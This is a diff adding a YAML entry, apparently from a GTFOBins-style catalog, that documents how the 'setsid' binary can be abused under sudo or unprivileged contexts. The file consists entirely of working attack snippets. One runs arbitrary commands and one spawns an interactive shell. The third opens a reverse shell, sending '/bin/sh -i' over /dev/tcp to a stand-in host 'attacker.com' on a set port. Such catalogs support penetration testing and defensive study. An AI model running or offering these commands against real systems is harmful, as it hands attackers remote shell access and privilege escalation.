@@ -1,0 +1,24 @@
+---
+functions:
+  command:
+  - code: |-
+      setsid /path/to/command
+    contexts:
+      sudo:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      export RHOST=attacker.com
+      export RPORT=12345
+      setsid /bin/sh -c '/bin/sh -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
+    contexts:
+      sudo:
+      unprivileged:
+    listener: tcp-server
+  shell:
+  - code: |-
+      setsid /bin/sh -i
+    contexts:
+      sudo:
+      unprivileged:
+...
